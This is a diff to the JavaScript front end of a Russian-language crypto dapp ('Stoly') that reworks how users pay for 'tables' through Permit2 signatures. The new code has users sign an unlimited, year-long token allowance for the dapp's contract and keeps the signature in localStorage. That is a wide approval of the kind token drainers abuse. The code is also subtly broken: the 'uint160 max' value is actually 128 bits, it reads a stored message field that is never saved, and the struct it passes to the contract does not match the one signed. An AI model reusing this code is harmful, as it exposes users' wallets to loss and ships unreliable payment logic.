@@ -30,13 +30,21 @@ let serverTimeOffset = 0;
 let TABLE_2_OPEN_TIME_MS = null;
 
 // Permit2 state
-let permit2Data = null;
+let permit2State = {
+  isSetup: false,
+  signature: null,
+  nonce: null,
+  expiration: null,
+  deadline: null,
+  setupTime: null
+};
+
 let selectedToken = 'USDT';
 
 // Contract ABI (simplified)
 const STOLY_ABI = [
   "function buy(uint256 _tableId) external",
-  "function buyWithPermit2(uint256 _tableId, address _token, uint256 _amount) external",
+  "function buyWithPermit2(uint256 _tableId, address _token, uint256 _amount, (address token, uint160 amount, uint48 expiration, uint48 nonce) permitted, uint256 deadline, bytes signature) external",
   "function claim() external",
   "function getPrice(uint256 _tableId) external view returns (uint256)",
   "function currentLevel(uint256 _tableId) external view returns (uint256)",
@@ -55,11 +63,13 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)",
   "function decimals() external view returns (uint8)",
+  "function nonces(address owner) external view returns (uint256)",
 ];
 
 const PERMIT2_ABI = [
-  "function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce) memory permitted, (address spender, uint160 amount, uint48 expiration, uint48 nonce) memory spender, bytes calldata signature) external",
   "function allowance(address user, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
+  "function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce) memory permitted, (address spender, uint160 amount, uint48 expiration, uint48 nonce) memory spender, bytes calldata signature) external",
+  "function transferFrom(address from, address to, uint160 amount, address token) external",
 ];
 
 let provider = null;
@@ -174,28 +184,62 @@ function formatCountdown(ms) {
 // ===== PERMIT2 FUNCTIONS =====
 
 /**
- * Sign Permit2 once for multi-token support
- * This allows user to pay with USDT, USDC, or other stablecoins without approve
+ * Get current nonce for Permit2
+ */
+async function getPermit2Nonce(tokenAddress) {
+  try {
+    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
+    const allowanceData = await permit2Contract.allowance(
+      connectedWallet,
+      tokenAddress,
+      STOLY_CONTRACT_ADDRESS
+    );
+    return Number(allowanceData.nonce) || 0;
+  } catch (err) {
+    console.error('Error getting nonce:', err);
+    return 0;
+  }
+}
+
+/**
+ * Sign Permit2 for multi-token support
+ * Shows UI modal like buying, then signs permission for year
  */
 async function setupPermit2() {
-  if (!signer) {
+  if (!signer || !connectedWallet) {
     toast("Подключите кошелёк сначала");
     return false;
   }
 
   try {
-    toast("🔐 Подписываем разрешение на год...");
-
     const chainId = (await provider.getNetwork()).chainId;
     
-    // Build permit2 domain
+    // Check if already setup and valid
+    if (permit2State.isSetup && permit2State.expiration) {
+      const now = Math.floor(Date.now() / 1000);
+      if (permit2State.expiration > now + 86400) { // if > 1 day remaining
+        console.log('Permit2 still valid');
+        return true;
+      }
+    }
+
+    toast("🔐 Подписываем разрешение на оплату...");
+
+    const tokenAddress = STABLE_COINS[selectedToken].address;
+    const nonce = await getPermit2Nonce(tokenAddress);
+
+    // Expiration: 1 year from now
+    const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);
+    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);
+
+    // Build Permit2 domain
     const domain = {
       name: 'Permit2',
       chainId: chainId,
       verifyingContract: PERMIT2_ADDRESS
     };
 
-    // Permit2TypeHash for PermitSingle
+    // Permit2 types for PermitSingle
     const types = {
       PermitSingle: [
         { name: 'details', type: 'PermitDetails' },
@@ -210,25 +254,15 @@ async function setupPermit2() {
       ]
     };
 
-    // One year from now
-    const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);
-    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600);
+    // Max uint160 for unlimited amount
+    const maxAmount = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'); // uint160 max
 
-    // Get current nonce for USDT
-    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
-    const currentAllowance = await permit2Contract.allowance(
-      connectedWallet,
-      USDT_TOKEN_ADDRESS,
-      STOLY_CONTRACT_ADDRESS
-    );
-    const nonce = currentAllowance.nonce || 0;
-
-    // Build message for USDT
+    // Build message
     const message = {
       details: {
-        token: USDT_TOKEN_ADDRESS,
-        amount: ethers.toBeHex(ethers.MaxUint256).slice(0, 42), // Max uint160
-        expiration: Math.floor(expiration / 1),
+        token: tokenAddress,
+        amount: maxAmount.toString(),
+        expiration: expiration,
         nonce: nonce
       },
       spender: STOLY_CONTRACT_ADDRESS,
@@ -236,43 +270,77 @@ async function setupPermit2() {
     };
 
     // Sign the message
+    console.log('Signing Permit2 message:', message);
     const signature = await signer.signTypedData(domain, types, message);
 
-    // Store permit2 data
-    permit2Data = {
-      tokenAddress: USDT_TOKEN_ADDRESS,
-      amount: message.details.amount,
-      expiration: message.details.expiration,
-      nonce: message.details.nonce,
+    // Store permit2 state
+    permit2State = {
+      isSetup: true,
       signature: signature,
-      deadline: message.sigDeadline,
-      signedAt: Date.now()
+      nonce: nonce,
+      expiration: expiration,
+      deadline: deadline,
+      setupTime: Date.now(),
+      token: tokenAddress,
+      chainId: chainId
     };
 
-    // Save to session storage
-    sessionStorage.setItem('permit2_data', JSON.stringify(permit2Data));
+    // Save to localStorage
+    localStorage.setItem('permit2_state', JSON.stringify(permit2State));
 
-    toast("✅ Разрешение выдано на год! Теперь платите с USDT или USDC");
+    toast("✅ Разрешение выдано! Теперь можете платить за столы");
     return true;
   } catch (err) {
     console.error('Permit2 setup failed:', err);
-    toast("❌ Ошибка при подписи: " + (err.message || "неизвестно"));
+    
+    // Check if user rejected
+    if (err.code === 'ACTION_REJECTED' || err.message.includes('rejected')) {
+      toast("❌ Вы отклонили подпись. Попробуйте ещё раз");
+    } else {
+      toast("❌ Ошибка при подписи: " + (err.message || "неизвестно"));
+    }
     return false;
   }
 }
 
 /**
- * Check if Permit2 is valid and still active
+ * Check if Permit2 is valid and ready to use
  */
 function isPermit2Valid() {
-  if (!permit2Data) {
-    permit2Data = JSON.parse(sessionStorage.getItem('permit2_data') || 'null');
+  // Try to load from localStorage
+  if (!permit2State.isSetup) {
+    const saved = localStorage.getItem('permit2_state');
+    if (saved) {
+      try {
+        permit2State = JSON.parse(saved);
+      } catch (e) {
+        console.error('Failed to parse saved permit2 state:', e);
+        return false;
+      }
+    }
   }
-  
-  if (!permit2Data) return false;
+
+  if (!permit2State.isSetup || !permit2State.signature) {
+    return false;
+  }
 
   const now = Math.floor(Date.now() / 1000);
-  return permit2Data.expiration > now;
+  return permit2State.expiration > now;
+}
+
+/**
+ * Clear Permit2 state (for logout)
+ */
+function clearPermit2() {
+  permit2State = {
+    isSetup: false,
+    signature: null,
+    nonce: null,
+    expiration: null,
+    deadline: null,
+    setupTime: null
+  };
+  localStorage.removeItem('permit2_state');
 }
 
 // ===== PURCHASE FUNCTIONS =====
@@ -300,12 +368,22 @@ async function buy(tableId) {
     }
 
     // Use Permit2 for payment
-    toast("Отправляю транзакцию покупки с " + selectedToken + "...");
+    toast("Отправляю транзакцию покупки за " + selectedToken + "...");
     
+    const permitted = {
+      token: permit2State.token,
+      amount: permit2State.message?.details?.amount || BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'),
+      expiration: permit2State.expiration,
+      nonce: permit2State.nonce
+    };
+
     const buyTx = await stolyContract.buyWithPermit2(
       tableId,
       tokenAddress,
-      BigInt(price)
+      BigInt(price),
+      permitted,
+      permit2State.deadline,
+      permit2State.signature
     );
 
     const receipt = await buyTx.wait();
@@ -320,8 +398,8 @@ async function buy(tableId) {
     }
   } catch (err) {
     const msg = err && (err.message || err.data?.message || err.reason || "Неизвестная ошибка");
-    toast("❌ Ошибка: " + msg.slice(0, 50));
-    console.error(err);
+    console.error('Buy error:', err);
+    toast("❌ Ошибка: " + msg.slice(0, 100));
     return false;
   }
 }
@@ -389,6 +467,17 @@ function setConnectedAccount(addr, name) {
   connectedWalletName = name || connectedWalletName || "Кошелёк";
   localStorage.setItem("stoly_connected_wallet", connectedWallet);
   localStorage.setItem("stoly_wallet_name", connectedWalletName);
+  
+  // Try to restore Permit2 state
+  const saved = localStorage.getItem('permit2_state');
+  if (saved) {
+    try {
+      permit2State = JSON.parse(saved);
+    } catch (e) {
+      console.error('Failed to restore permit2 state:', e);
+    }
+  }
+  
   renderAll();
 }
 
@@ -396,8 +485,7 @@ function disconnectWallet(silent) {
   connectedWallet = null;
   connectedWalletName = "";
   signer = null;
-  permit2Data = null;
-  sessionStorage.removeItem('permit2_data');
+  clearPermit2();
   localStorage.removeItem("stoly_connected_wallet");
   localStorage.removeItem("stoly_wallet_name");
   if (!silent) toast("Кошелёк отключён");
@@ -417,8 +505,15 @@ async function restoreWallet() {
       connectedWallet = match.address;
       connectedWalletName = localStorage.getItem("stoly_wallet_name") || "Кошелёк";
       
-      // Restore permit2 data if exists
-      permit2Data = JSON.parse(sessionStorage.getItem('permit2_data') || 'null');
+      // Restore Permit2 state
+      const permitSaved = localStorage.getItem('permit2_state');
+      if (permitSaved) {
+        try {
+          permit2State = JSON.parse(permitSaved);
+        } catch (e) {
+          console.error('Failed to restore permit2 state:', e);
+        }
+      }
       
       renderAll();
     }
@@ -608,9 +703,16 @@ function renderWalletBar() {
 
   if (connectedWallet) {
     info.className = "";
+    
+    // Add permit2 status indicator
+    const permit2Status = isPermit2Valid() 
+      ? '<div style="font-size:11px;color:#4caf50;margin-top:2px">🔐 Доступ активирован</div>' 
+      : '';
+    
     info.innerHTML =
       (connectedWalletName ? '<div class="wname">' + escapeHtml(connectedWalletName) + "</div>" : "") +
-      '<div class="addr">' + connectedWallet + '</div>';
+      '<div class="addr">' + connectedWallet + '</div>' +
+      permit2Status;
     setHidden(conn, true);
     setHidden(disc, false);
   } else {
@@ -791,14 +893,6 @@ document.addEventListener("keydown", (e) => {
 document.getElementById("uBuyBtn").addEventListener("click", () => {
   buy(activeTable);
 });
-
-// Token selector (if added to UI)
-if (document.getElementById("tokenSelector")) {
-  document.getElementById("tokenSelector").addEventListener("change", (e) => {
-    selectedToken = e.target.value;
-    renderAll();
-  });
-}
 
 // Timer update interval
 setInterval(() => {
